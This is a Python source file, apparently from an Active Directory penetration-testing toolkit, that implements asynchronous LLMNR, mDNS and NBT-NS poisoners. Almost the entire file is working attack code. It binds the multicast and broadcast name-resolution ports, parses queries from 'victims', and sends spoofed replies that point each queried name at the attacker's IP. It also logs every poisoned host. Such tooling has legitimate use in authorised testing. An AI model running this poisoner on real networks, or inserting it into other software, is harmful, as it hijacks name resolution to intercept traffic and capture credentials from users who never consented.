"""Async LLMNR / mDNS / NBT-NS poisoners.

Each poisoner binds the appropriate UDP socket via ``asysocks``'
``UniServer`` (which already handles multicast group registration on IPv4
and IPv6 for LLMNR/mDNS, and ``SO_BROADCAST`` for NBT-NS), reads inbound
datagrams from an ``asyncio.Queue``, parses the query, decides whether to
respond based on a per-host filter, and replies pointing at the configured
attacker IP.

Public surface
--------------
- ``PoisonerConfig`` — IP/interface + filtering knobs.
- ``PoisonObservation`` — emitted on every poisoned reply for telemetry.
- ``LLMNRPoisoner``, ``MDNSPoisoner``, ``NBTNSPoisoner`` — async start/stop.

The orchestrator (``PoisoningSuite``) lives in ``orchestrator.py`` and
composes the three.
"""

from __future__ import annotations

import asyncio
import contextlib
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field

from adscan_internal.rich_output import print_info_debug
from adscan_internal.services.poisoning.packets import (
    build_llmnr_response,
    build_mdns_response,
    build_nbtns_response,
    parse_llmnr_query,
    parse_mdns_query,
    parse_nbtns_query,
)


# ---------------------------------------------------------------------------
# Public types
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class PoisonerConfig:
    """Configuration shared by all three poisoners.

    ``interface_name`` is required: ``asysocks`` uses it to look up the IPs
    bound to that interface for multicast group registration (LLMNR/mDNS) and
    broadcast bind (NBT-NS).  ``our_ipv4`` is the address advertised back to
    victims; if ``None`` it is auto-derived from the interface.
    """

    interface_name: str
    our_ipv4: str | None = None
    our_ipv6: str | None = None

    # Hostname filter — if set, only respond to names matching one of these
    # (case-insensitive substring match).  Empty set = respond to everything.
    name_allowlist: frozenset[str] = field(default_factory=frozenset)

    # Hosts we must never poison (e.g. DC IPs, our own IP).
    ip_denylist: frozenset[str] = field(default_factory=frozenset)

    ttl_seconds: int | None = None  # None = use protocol default


@dataclass(frozen=True)
class PoisonObservation:
    """Emitted to ``observation_callback`` after every poisoned reply."""

    protocol: str          # "llmnr" | "mdns" | "nbtns"
    victim_ip: str
    queried_name: str


PoisonCallback = Callable[[PoisonObservation], Awaitable[None]] | None


# ---------------------------------------------------------------------------
# Common helpers
# ---------------------------------------------------------------------------

def _interface_primary_ipv4(interface_name: str) -> str | None:
    """Return the first IPv4 address bound to ``interface_name`` (or ``None``)."""

    from adscan_core.pal import net as pal_net

    return pal_net.interface_ipv4_for(interface_name)


def _should_respond(
    config: PoisonerConfig,
    *,
    our_ipv4: str | None,
    victim_ip: str,
    queried_name: str,
) -> bool:
    """Apply allow/deny filters."""

    if victim_ip in config.ip_denylist:
        return False
    if our_ipv4 and victim_ip == our_ipv4:
        # Don't poison our own probes.
        return False
    if config.name_allowlist:
        lowered = queried_name.casefold()
        if not any(token.casefold() in lowered for token in config.name_allowlist):
            return False
    return True


# ---------------------------------------------------------------------------
# Base
# ---------------------------------------------------------------------------

class _Poisoner:
    """Shared lifecycle: build asysocks UDPServer, read queue, dispatch."""

    protocol: str = ""
    bindtype: int = 0  # asysocks bindtype: 2=LLMNR, 3=NBTNS, 4=MDNS

    def __init__(
        self,
        config: PoisonerConfig,
        observation_callback: PoisonCallback = None,
    ) -> None:
        self._config = config
        self._observation_callback = observation_callback
        self._server = None
        self._task: asyncio.Task[None] | None = None
        self._stop_event = asyncio.Event()
        self._our_ipv4 = config.our_ipv4 or _interface_primary_ipv4(
            config.interface_name
        )
        self._our_ipv6 = config.our_ipv6
        self._raw_socket = None  # set in start() after asysocks binds

    async def start(self) -> None:
        """Bind the socket and start the dispatch loop."""

        from asysocks.unicomm.common.packetizers import Packetizer  # noqa: PLC0415
        from asysocks.unicomm.common.target import UniProto, UniTarget  # noqa: PLC0415
        from asysocks.unicomm.server import UniServer  # noqa: PLC0415

        # asysocks treats target.hostname as the interface NAME for multicast
        # registration / broadcast bind.  Port is ignored for LLMNR/mDNS
        # (hardcoded inside start_*_server) but required for NBT-NS (137).
        target = UniTarget(
            self._config.interface_name,
            self._listen_port(),
            UniProto.SERVER_UDP,
        )
        self._server = UniServer(target, Packetizer(), bindtype=self.bindtype)
        ok, err = await self._server.start_udp_server()
        if not ok:
            raise RuntimeError(
                f"{self.protocol} poisoner failed to bind on "
                f"{self._config.interface_name}: {err}"
            )
        in_queue: asyncio.Queue = self._server.udpprotocol.in_queue
        # asyncio.trsock.TransportSocket (Python ≥3.12) has no sendto().
        # Use the raw socket stored on udpsocket instead.
        self._raw_socket = self._server.udpsocket
        self._stop_event.clear()
        self._task = asyncio.create_task(self._dispatch_loop(in_queue))
        print_info_debug(
            f"[{self.protocol}-poisoner] listening on iface "
            f"{self._config.interface_name}, advertising {self._our_ipv4}"
        )

    async def stop(self) -> None:
        """Stop the dispatch loop and tear down the socket."""

        self._stop_event.set()
        if self._task is not None:
            self._task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._task
            self._task = None
        if self._server is not None:
            transport = self._server.udptransport
            if transport is not None:
                with contextlib.suppress(Exception):
                    transport.close()
            self._server = None

    # -- subclass hooks ----------------------------------------------------

    def _listen_port(self) -> int:
        raise NotImplementedError

    async def _handle_datagram(
        self, sock, data: bytes, addr: tuple[str, int]
    ) -> None:
        raise NotImplementedError

    # -- main loop ---------------------------------------------------------

    async def _dispatch_loop(self, in_queue: asyncio.Queue) -> None:
        while not self._stop_event.is_set():
            try:
                item = await asyncio.wait_for(in_queue.get(), timeout=0.5)
            except asyncio.TimeoutError:
                continue
            if not isinstance(item, tuple) or len(item) != 3:
                # connection_lost path: (None, exc) — exit cleanly.
                return
            sock, data, addr = item
            try:
                await self._handle_datagram(sock, data, addr)
            except Exception as exc:  # noqa: BLE001
                print_info_debug(
                    f"[{self.protocol}-poisoner] handler error from {addr}: {exc}"
                )

    async def _emit(self, observation: PoisonObservation) -> None:
        if self._observation_callback is not None:
            with contextlib.suppress(Exception):
                await self._observation_callback(observation)


# ---------------------------------------------------------------------------
# LLMNR — UDP 5355
# ---------------------------------------------------------------------------

class LLMNRPoisoner(_Poisoner):
    protocol = "llmnr"
    bindtype = 2

    def _listen_port(self) -> int:
        return 5355

    async def _handle_datagram(self, sock, data: bytes, addr: tuple[str, int]) -> None:
        query = parse_llmnr_query(data)
        if query is None:
            return
        victim_ip = addr[0].replace("::ffff:", "")
        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
            return
        ttl = self._config.ttl_seconds if self._config.ttl_seconds is not None else 30
        reply = build_llmnr_response(
            query,
            our_ipv4=self._our_ipv4,
            our_ipv6=self._our_ipv6,
            ttl_seconds=ttl,
        )
        if reply is None:
            return
        if self._raw_socket is not None:
            self._raw_socket.sendto(reply, addr)
        await self._emit(PoisonObservation("llmnr", victim_ip, query.name))


# ---------------------------------------------------------------------------
# mDNS — UDP 5353
# ---------------------------------------------------------------------------

class MDNSPoisoner(_Poisoner):
    protocol = "mdns"
    bindtype = 4

    def _listen_port(self) -> int:
        return 5353

    async def _handle_datagram(self, sock, data: bytes, addr: tuple[str, int]) -> None:
        query = parse_mdns_query(data)
        if query is None:
            return
        victim_ip = addr[0].replace("::ffff:", "")
        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
            return
        ttl = self._config.ttl_seconds if self._config.ttl_seconds is not None else 120
        reply = build_mdns_response(
            query,
            our_ipv4=self._our_ipv4,
            our_ipv6=self._our_ipv6,
            ttl_seconds=ttl,
        )
        if reply is None:
            return
        if self._raw_socket is not None:
            self._raw_socket.sendto(reply, addr)
        await self._emit(PoisonObservation("mdns", victim_ip, query.name))


# ---------------------------------------------------------------------------
# NBT-NS — UDP 137
# ---------------------------------------------------------------------------

class NBTNSPoisoner(_Poisoner):
    protocol = "nbtns"
    bindtype = 3

    def _listen_port(self) -> int:
        return 137

    async def _handle_datagram(self, sock, data: bytes, addr: tuple[str, int]) -> None:
        query = parse_nbtns_query(data)
        if query is None:
            return
        victim_ip = addr[0].replace("::ffff:", "")
        if not _should_respond(self._config, our_ipv4=self._our_ipv4, victim_ip=victim_ip, queried_name=query.name):
            return
        if self._our_ipv4 is None:
            return  # NBT-NS is IPv4-only — can't respond without an IPv4.
        ttl = (
            self._config.ttl_seconds if self._config.ttl_seconds is not None else 165
        )
        reply = build_nbtns_response(
            query, our_ipv4=self._our_ipv4, ttl_seconds=ttl
        )
        if self._raw_socket is not None:
            self._raw_socket.sendto(reply, addr)
        await self._emit(PoisonObservation("nbtns", victim_ip, query.name))


__all__ = [
    "LLMNRPoisoner",
    "MDNSPoisoner",
    "NBTNSPoisoner",
    "PoisonObservation",
    "PoisonerConfig",
]
